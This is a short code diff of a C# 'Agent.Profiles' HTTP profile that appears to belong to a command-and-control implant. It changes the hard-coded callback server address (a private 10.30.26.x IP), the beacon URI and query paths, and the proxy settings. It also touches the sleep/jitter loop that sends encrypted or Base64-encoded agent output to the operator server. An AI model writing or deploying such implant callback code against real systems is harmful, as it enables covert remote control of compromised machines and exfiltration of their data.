@@ -35,15 +35,15 @@ namespace Agent.Profiles
             this.logger = logger;
             this.messageManager = messageManager;
             int callbackPort = Int32.Parse("80");
-            string callbackHost = "http://10.30.26.108";
-            string getUri = "index";
-            string queryPath = "q";
+            string callbackHost = "http://10.30.26.115";
+            string getUri = "q";
+            string queryPath = "index";
             string postUri = "data";
             this.userAgent = "";
             this.hostHeader = "";
             this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
-            this.proxyHost = ":";
+            this.proxyHost = "";
             this.proxyPass = "";
             this.proxyUser = "";
 
@@ -114,8 +114,7 @@ namespace Agent.Profiles
                 await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                 try
                 {
-                    string responseString = await this.Send(await messageManager.GetAgentResponseStringAsync());
-
+                    string responseString = await this.Send(messageManager.GetAgentResponseString());
                     if (String.IsNullOrEmpty(responseString))
                     {
                         this.currentAttempt++;
@@ -150,9 +149,9 @@ namespace Agent.Profiles
         {
             try
             {
+
                 //This will encrypted if AES is selected or just Base64 encode if None is referenced.
                 json = this.crypt.Encrypt(json);
-
 
                 HttpResponseMessage response;
 
